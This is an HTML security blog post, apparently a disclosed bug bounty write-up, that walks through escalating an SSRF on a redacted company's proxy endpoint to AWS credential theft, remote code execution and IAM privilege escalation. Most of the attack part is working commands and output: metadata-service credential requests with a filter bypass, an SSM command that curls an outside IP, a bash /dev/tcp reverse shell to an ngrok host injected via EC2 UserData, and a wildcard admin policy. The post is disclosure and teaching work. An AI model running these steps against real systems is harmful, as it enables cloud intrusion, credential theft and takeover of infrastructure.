@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Hey everyone, not a CTF write-up today but my first Bug Bounty Bounty story: SSRF escalation to RCE on AWS. The vulnerability was initially reported on the 20th of July 2021, rewarded as a valid findi">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Bug Bounty Story: Escalating SSRF to RCE on AWS">
+<meta property="og:url" content="https://hg8.sh/posts/bugbounty/ssrf-to-rce-aws/index.html">
+<meta property="og:site_name" content="hg8&#39;s Notes — My notes about infosec world. Pentest&#x2F;Bug Bounty&#x2F;CTF Writeups.">
+<meta property="og:description" content="Hey everyone, not a CTF write-up today but my first Bug Bounty Bounty story: SSRF escalation to RCE on AWS. The vulnerability was initially reported on the 20th of July 2021, rewarded as a valid findi">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/180664582-999e12da-360f-4a7e-817d-df831d84d9e5.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/180665565-93b7af23-0152-4ec4-b958-2061e65d3a78.png">
+<meta property="article:published_time" content="2022-07-28T22:00:00.000Z">
+<meta property="article:modified_time" content="2022-07-29T21:05:15.625Z">
+<meta property="article:author" content="hg8">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="SSRF">
+<meta property="article:tag" content="bug bounty">
+<meta property="article:tag" content="AWS">
+<meta property="article:tag" content="IAM">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://user-images.githubusercontent.com/9076747/180664582-999e12da-360f-4a7e-817d-df831d84d9e5.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+     
+    <title>Bug Bounty Story: Escalating SSRF to RCE on AWS :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.</title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+    
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="hg8's Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups." type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/posts/admirertoo/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+    </span>
+    <br/>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Recon"><span class="toc-number">1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF-To-AWS-Credentials-Disclosure"><span class="toc-number">2.</span> <span class="toc-text">SSRF To AWS Credentials Disclosure</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Remote-Code-Execution"><span class="toc-number">3.</span> <span class="toc-text">Remote Code Execution</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#via-send-command"><span class="toc-number">3.1.</span> <span class="toc-text">via send-command</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#via-UserData"><span class="toc-number">3.2.</span> <span class="toc-text">via UserData</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Escalating-privileges"><span class="toc-number">4.</span> <span class="toc-text">Escalating privileges</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Remediation-recommendation"><span class="toc-number">5.</span> <span class="toc-text">Remediation recommendation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-number">6.</span> <span class="toc-text">References</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Timeline"><span class="toc-number">7.</span> <span class="toc-text">Timeline</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        <header id="header">
+  <a href="/">
+  
+      <div id="logo" style="background-image: url(/images/logo.webp);"></div>
+  
+    <span class="logo__mark"></span>
+    <span class="logo__text">./hg8.sh</span>
+    <span class="logo__cursor"></span>
+  </a>
+  <div id="nav">
+    <ul>
+      <li class="icon">
+        <a href="#"><i class="fas fa-bars fa-2x"></i></a>
+      </li>
+       
+        <li><a href="/">Home</a></li>
+       
+        <li><a href="/about/">About</a></li>
+       
+        <li><a href="/archives/">Posts</a></li>
+       
+        <li><a href="/search/">Search</a></li>
+      
+    </ul>
+  </div>
+</header>
+
+        
+          <br>
+          <br>
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Bug Bounty Story: Escalating SSRF to RCE on AWS
+    </h1>
+
+
+
+    <div class="meta"> 
+      
+    <div class="postdate">
+      
+        <time datetime="2022-07-28T22:00:00.000Z" itemprop="datePublished">29-07-2022</time>
+        
+      
+    </div>
+
+
+      — Written by 
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">hg8</span>
+      </span>
+      —
+      7 min read
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>Hey everyone, not a CTF write-up today but my first Bug Bounty Bounty story: SSRF escalation to RCE on AWS.</p>
+<p>The vulnerability was initially reported on the 20th of July 2021, rewarded as a valid finding on the 22th of July, and patched by the 1st of August. The communication with the company was really good, a patch was rolled out quickly and after a few bypass fixes, it got completely resolved and bounty got granted.</p>
+<p>Discovery was made on a private bug bounty program so the company name has been redacted.</p>
+<p>In this post I will get into details on how the vulnerability was discovered in order to show the research process. Hopefully this will come useful if you are new to the bug bounty world.</p>
+<h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><p>While doing the usual recon phase (the same done for CTF basically) on the company subdomains, an interesting <code>proxify</code> endpoint pops up. We can guess it’s used to proxy something.</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/180664582-999e12da-360f-4a7e-817d-df831d84d9e5.png" alt="gobuster proxify endpoint"></p>
+<p>The endpoint is publicly accessible when setting up the referrer used to navigate the application. When calling the endpoint directly we got informed it require an URL to be provided:</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt; curl --referer &lt;redacted&gt; https://&lt;redacted&gt;/proxify/ -i</span><br><span class="line"><span class="meta">HTTP/2</span> <span class="number">400</span></span><br><span class="line"><span class="attribute">date</span><span class="punctuation">: </span>Tue, 20 Jul 2021 10:26:20 GMT</span><br><span class="line"><span class="attribute">content-type</span><span class="punctuation">: </span>text/html; charset=utf-8</span><br><span class="line"><span class="attribute">content-length</span><span class="punctuation">: </span>13</span><br><span class="line"><span class="attribute">cache-control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">vary</span><span class="punctuation">: </span>Accept-Encoding</span><br><span class="line"><span class="attribute">vary</span><span class="punctuation">: </span>accept-encoding</span><br><span class="line"></span><br><span class="line"><span class="lasso">Need <span class="keyword">to</span> <span class="keyword">provide</span> url%</span></span><br><span class="line"><span class="lasso"></span></span><br></pre></td></tr></table></figure>
+
+<p>Let’s try to add an url as GET parameter: </p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&gt; curl --referer &lt;redacted&gt; &quot;https://&lt;redacted&gt;/proxify/?url=https://example.com&quot; -i</span><br><span class="line"><span class="meta">HTTP/2</span> <span class="number">200</span> </span><br><span class="line"><span class="attribute">date</span><span class="punctuation">: </span>Sun, 20 Jul 2021 10:26:58 GMT</span><br><span class="line"><span class="attribute">server</span><span class="punctuation">: </span>ECS (dcb/7F3B)</span><br><span class="line"><span class="attribute">vary</span><span class="punctuation">: </span>Accept-Encoding</span><br><span class="line"><span class="attribute">vary</span><span class="punctuation">: </span>Accept-Encoding,accept-encoding</span><br><span class="line"><span class="attribute">via</span><span class="punctuation">: </span>&lt;redacted&gt;</span><br><span class="line"><span class="attribute">x-cache</span><span class="punctuation">: </span>HIT</span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Example Domain<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml">(...)</span></span><br><span class="line"><span class="xml"></span></span><br></pre></td></tr></table></figure>
+
+<p>Having a service making HTTP requests for a user’s chosen URL is risky and if not properly handled can lead to a Server Side Request Forgery vulnerability.</p>
+<blockquote>
+<p>Server-side request forgery (also known as SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make requests to an unintended location.<br>In a typical SSRF attack, the attacker might cause the server to make a connection to internal-only services within the organization’s infrastructure. In other cases, they may be able to force the server to connect to arbitrary external systems, potentially leaking sensitive data such as authorization credentials.<br><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/ssrf">https://portswigger.net/web-security/ssrf</a></p>
+</blockquote>
+<p>It’s possible to verify that the service is vulnerable to SSRF by inputting an URL we have control over. To do so we can use <code>interact.sh</code>, an <a target="_blank" rel="noopener" href="https://github.com/projectdiscovery/interactsh">open source</a> out of band interaction gathering server (a free alternative to Burp Collaborator).</p>
+<p>First we open our listener:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt; interactsh-client</span><br><span class="line">    _       __                       __       __  </span><br><span class="line">   (_)___  / /____  _________ ______/ /______/ /_ </span><br><span class="line">  / / __ \/ __/ _ \/ ___/ __ <span class="string">&#x27;/ ___/ __/ ___/ __ \</span></span><br><span class="line"><span class="string"> / / / / / /_/  __/ /  / /_/ / /__/ /_(__  ) / / /</span></span><br><span class="line"><span class="string">/_/_/ /_/\__/\___/_/   \__,_/\___/\__/____/_/ /_/ v0.0.3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	             	projectdiscovery.io</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[INF] Listing 1 payload for OOB Testing</span></span><br><span class="line"><span class="string">[INF] abcdefghijklmnopkrstuvwxyz.interact.sh</span></span><br></pre></td></tr></table></figure>
+
+<p>Then we use the generated URL on the <code>proxify/</code> endpoint:</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt; curl --referer &lt;redacted&gt; &quot;https://&lt;redacted&gt;/proxify/?url=https://abcdefghijklmnopkrstuvwxyz.interact.sh&quot; -i</span><br><span class="line"><span class="meta">HTTP/2</span> <span class="number">200</span> </span><br><span class="line"><span class="attribute">date</span><span class="punctuation">: </span>Sun, 20 Jul 2021 10:27:52 GMT</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>interact.sh</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>72</span><br><span class="line"><span class="attribute">via</span><span class="punctuation">: </span>&lt;redacted&gt;</span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span>abcdefghijklmnopkrstuvwxyz<span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>Once the request done, <a target="_blank" rel="noopener" href="https://intereact.sh/"><code>intereact.sh</code></a> immediately received an HTTP request coming from the application server, confirming the SSRF vulnerability:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/180665565-93b7af23-0152-4ec4-b958-2061e65d3a78.png" alt="interact.sh output SSRF"></p>
+<h2 id="SSRF-To-AWS-Credentials-Disclosure"><a href="#SSRF-To-AWS-Credentials-Disclosure" class="headerlink" title="SSRF To AWS Credentials Disclosure"></a>SSRF To AWS Credentials Disclosure</h2><p>With our bug bounty hunter eyes (or with Google) we can recognize that the caller IP shown by <a target="_blank" rel="noopener" href="http://interact.sh/"><code>interact.sh</code></a> belongs to AWS. Knowing this we can try to connect AWS Private IP to disclose metadata.</p>
+<p>AWS EC2 Instances have access to a metadata service at <code>169.254.169.254</code>. This service returns a lot of information about the instance such as its IP address, the application tokens, the security group name, etc. Depending on the configuration we can also find IAM credentials to authenticate as this role. If IMDS version 1 is used, SSRF can be used to steal those information and credentials. </p>
+<p>Let’s first try to retrieve security credentials (<code>https://169.254.169.254/latest/meta-data/iam/security-credentials/</code>). </p>
+<p>Unfortunately we get hit by the following error:</p>
+<blockquote>
+<p>URL parameter can not be a private URL</p>
+</blockquote>
+<p>But, after a few trial and error, we found that dropping the <code>http</code> scheme allows to bypass the restriction:</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt; curl --referer &lt;redacted&gt; &quot;https://&lt;redacted&gt;/proxify/?url=169.254.169.254/latest/meta-data/iam/security-credentials/&quot; -i</span><br><span class="line"><span class="meta">HTTP/2</span> <span class="number">200</span></span><br><span class="line"><span class="attribute">date</span><span class="punctuation">: </span>Tue, 20 Jul 2021 10:34:00 GMT</span><br><span class="line"><span class="attribute">content-length</span><span class="punctuation">: </span>20</span><br><span class="line"><span class="attribute">server</span><span class="punctuation">: </span>EC2ws</span><br><span class="line"><span class="attribute">via</span><span class="punctuation">: </span>&lt;redacted&gt;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">ec2-<span class="keyword">default</span>-ssm</span></span><br></pre></td></tr></table></figure>
+
+<p>Once we have retrieved the role name we can retrieve all credentials:</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&gt; curl --referer &lt;redacted&gt; &quot;https://&lt;redacted&gt;/proxify/?url=169.254.169.254/latest/meta-data/iam/security-credentials/ec2-default-ssm&quot; -i</span><br><span class="line"><span class="meta">HTTP/2</span> <span class="number">200</span></span><br><span class="line"><span class="attribute">date</span><span class="punctuation">: </span>Tue, 20 Jul 2021 10:36:50 GMT</span><br><span class="line"><span class="attribute">content-length</span><span class="punctuation">: </span>1337</span><br><span class="line"><span class="attribute">server</span><span class="punctuation">: </span>EC2ws</span><br><span class="line"><span class="attribute">via</span><span class="punctuation">: </span>&lt;redacted&gt;</span><br><span class="line"></span><br><span class="line"><span class="ada">&#123;</span></span><br><span class="line"><span class="ada">  <span class="string">&quot;Code&quot;</span> : &quot;<span class="type">Success</span><span class="string">&quot;,</span></span></span><br><span class="line"><span class="string"><span class="ada">  &quot;</span>LastUpdated<span class="string">&quot; : &quot;</span><span class="number">2021</span>-<span class="number">07</span>-<span class="number">20</span>T09:<span class="number">03</span>:<span class="number">23</span>Z<span class="string">&quot;,</span></span></span><br><span class="line"><span class="string"><span class="ada">  &quot;</span><span class="keyword">Type</span><span class="string">&quot; : &quot;</span>AWS-HMAC<span class="string">&quot;,</span></span></span><br><span class="line"><span class="string"><span class="ada">  &quot;</span>AccessKeyId<span class="string">&quot; : &quot;</span>&lt;redacted&gt;<span class="string">&quot;,</span></span></span><br><span class="line"><span class="string"><span class="ada">  &quot;</span>SecretAccessKey<span class="string">&quot; : &quot;</span>&lt;redacted&gt;<span class="string">&quot;,</span></span></span><br><span class="line"><span class="string"><span class="ada">  &quot;</span>Token<span class="string">&quot; : &quot;</span>&lt;redacted&gt;<span class="string">&quot;,</span></span></span><br><span class="line"><span class="string"><span class="ada">  &quot;</span>Expiration<span class="string">&quot; : &quot;</span><span class="number">2021</span>-<span class="number">07</span>-<span class="number">20</span>T16:<span class="number">10</span>:<span class="number">48</span>Z<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="ada">&#125;%</span></span></span><br><span class="line"><span class="string"><span class="ada"></span></span></span><br></pre></td></tr></table></figure>
+
+<p>Bingo. These credentials can then be used with AWS CLI to make API calls as the IAM role.</p>
+<p>Let’s import the profile with AWS CLI to continue our enumeration and see if we can escalate our privileges:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; aws configure --profile bugbounty</span><br><span class="line">AWS Access Key ID [None]: &lt;redacted&gt;</span><br><span class="line">AWS Secret Access Key [None]: &lt;redacted&gt;</span><br><span class="line">Default region name [None]: eu-west-1</span><br><span class="line">Default output format [None]: json</span><br></pre></td></tr></table></figure>
+
+<p>This allows us to retrieve the account ID:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; aws sts get-caller-identity</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;UserId&quot;</span>: <span class="string">&quot;&lt;redacted&gt;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Account&quot;</span>: <span class="string">&quot;&lt;redacted&gt;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Arn&quot;</span>: <span class="string">&quot;&lt;redacted&gt;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Remote-Code-Execution"><a href="#Remote-Code-Execution" class="headerlink" title="Remote Code Execution"></a>Remote Code Execution</h2><h3 id="via-send-command"><a href="#via-send-command" class="headerlink" title="via send-command"></a>via send-command</h3><p>From here the best case scenario for us would be to achieve remote code execution on the EC2 instance.</p>
+<p>The easiest way is by listing instances for which security credential is accepted for executing commands.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; aws ssm describe-instance-information --output text --query <span class="string">&quot;InstanceInformationList[*]&quot;</span></span><br><span class="line">&lt;redacted&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Unfortunately the role is not authorized to perform <code>send-command</code>. Otherwise we could have used the following  command to gain RCE:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; aws ssm send-command --document-name <span class="string">&quot;AWS-RunShellScript&quot;</span> --comment <span class="string">&quot;RCE&quot;</span> --targets <span class="string">&quot;Key=instanceids,Values=[instanceid]&quot;</span> --parameters <span class="string">&#x27;commands=curl 213.62.1.1:8000/`whoami`&#x27;</span></span><br><span class="line">An error occurred (AccessDeniedException) when calling the SendCommand operation: User: &lt;redacted&gt; is not authorized to perform: ssm:SendCommand on resource: &lt;redacted&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="via-UserData"><a href="#via-UserData" class="headerlink" title="via UserData"></a>via UserData</h3><p><em>This second method will trigger alarms and service downtime but can still achieve remote code execution in some scenarios.</em> </p>
+<p>I<em>n order to not disrupt services this method got shared with the team first and after discussions we got a test instance on which we could validate the PoC safely.</em></p>
+<p>When configuring an EC2 instance you can specify commands which will be automatically executed after booting a machine (via <code>UserData</code>).</p>
+<p><code>UserData</code> are base64 encoded and can be retrieved through the <code>user-data</code> endpoint:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; curl http://169.254.169.254/latest/user-data </span><br></pre></td></tr></table></figure>
+
+<p>Our goal here is to modify the <code>UserData</code> to include our command and restart the EC2 instance to get it executed upon boot. Of course this will trigger alarms and short downtime because the instance needs to be restarted.</p>
+<p>Here is how to proceed:</p>
+<ol>
+<li>Stop the chosen instance</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; aws ec2 stop-instances –instance-ids i-xxxxxxxxxxxxxxx</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>Add a reverse shell script at the end of the existing instance’s <code>Userdata</code> (if any)</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/0.tcp.ngrok.io/15547 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>Then update the <code>UserData</code> of the instance with the newly created script:</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; base64 user_data.sh &gt; user_data64.sh</span><br><span class="line">&gt; aws ec2 modify-instance-attribute \\</span><br><span class="line">    --instance-id=i-xxxxxxxxxxxxxxx \\</span><br><span class="line">    --attribute userData --value file://user_data64.sh</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>Start a local listener to catch the reverse shell</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; nc -lvp 15547</span><br><span class="line">Listening on 0.0.0.0 15547</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>Launch the instance  with the newly added <code>UserData</code>:</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; aws ec2 start-instances –instance-ids i-xxxxxxxxxxxxxxx</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>And bingo! We get a shell on the instance. </p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; nc -lvp <span class="number">15547</span></span><br><span class="line">Listening on <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> <span class="number">15547</span></span><br><span class="line">[root@xxx-xx-xx-xxx html]# </span><br></pre></td></tr></table></figure>
+
+<p><em>Note: All those step can be contained in one command using <a target="_blank" rel="noopener" href="https://yeswehack.com/redirect?url=https://github.com/RhinoSecurityLabs/pacu&expires=1645125367&token=494266cb66d653e5833087b5b14b4f130b6b2e5682382983a8b66094c251bbe9">Pacu</a>:</em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Pacu &gt; run ec2__startup_shell_script --script user_data.sh --instance-ids i-xxxxxxxxxxxxxxx@eu-west-1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="Escalating-privileges"><a href="#Escalating-privileges" class="headerlink" title="Escalating privileges"></a>Escalating privileges</h2><p>Unfortunately we quickly notice that we barely have any permission on the instance. Bummer.</p>
+<p>Fortunately we took note earlier that our current user have the permission to create policies version:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&gt; aws iam get-policy-version --policy-arn arn:aws:iam::xxxxxxxxxxxxxxx:policy/MyPolicy --version-id v2</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;PolicyVersion&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;CreateDate&quot;</span>: <span class="string">&quot;2015-06-17T19:23;32Z&quot;</span>,</span><br><span class="line">        <span class="string">&quot;VersionId&quot;</span>: <span class="string">&quot;v2&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Document&quot;</span>: &#123;</span><br><span class="line">                      <span class="string">&quot;Version&quot;</span>: <span class="string">&quot;2012-10-17&quot;</span>,</span><br><span class="line">                      <span class="string">&quot;Statement&quot;</span>: [</span><br><span class="line">                              &#123;</span><br><span class="line">                                      <span class="string">&quot;Action&quot;</span>: <span class="string">&quot;iam:CreatePolicyVersion&quot;</span>,</span><br><span class="line">                                      <span class="string">&quot;Resource&quot;</span>: <span class="string">&quot;*&quot;</span>,</span><br><span class="line">                                      <span class="string">&quot;Effect&quot;</span>: <span class="string">&quot;Allow&quot;</span></span><br><span class="line">                              &#125;</span><br><span class="line">                      ]</span><br><span class="line">                &#125;</span><br><span class="line">        <span class="string">&quot;IsDefaultVersion&quot;</span>: <span class="string">&quot;false&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Let’s create a new policy with every permissions and set it as default:</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@xxx-xx-xx-xxx html]# aws iam create-policy \</span><br><span class="line">    --set-as-default --policy-document \</span><br><span class="line">&#x27;&#123;</span><br><span class="line">    <span class="attr">&quot;Version&quot;</span>: <span class="string">&quot;2012-10-17&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;Statement&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;Effect&quot;</span>: <span class="string">&quot;Allow&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;Action&quot;</span>: <span class="string">&quot;*&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;Resource&quot;</span>: <span class="string">&quot;*&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>And we are done! The new <code>ec2_role</code> is now allowed to perform any arbitrary action. Full control over the instance.</p>
+<h2 id="Remediation-recommendation"><a href="#Remediation-recommendation" class="headerlink" title="Remediation recommendation"></a>Remediation recommendation</h2><p>See <a target="_blank" rel="noopener" href="https://yeswehack.com/redirect?url=https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html&expires=1645125367&token=e9822bd3d7c7fd416cbd9a9b7fcf4f5c2abea5df02ccca194bd6efcae6ec731d">OWASP SSRF Prevention guide</a>.</p>
+<p>To resume: </p>
+<ul>
+<li>Properly sanitize every user’s input.</li>
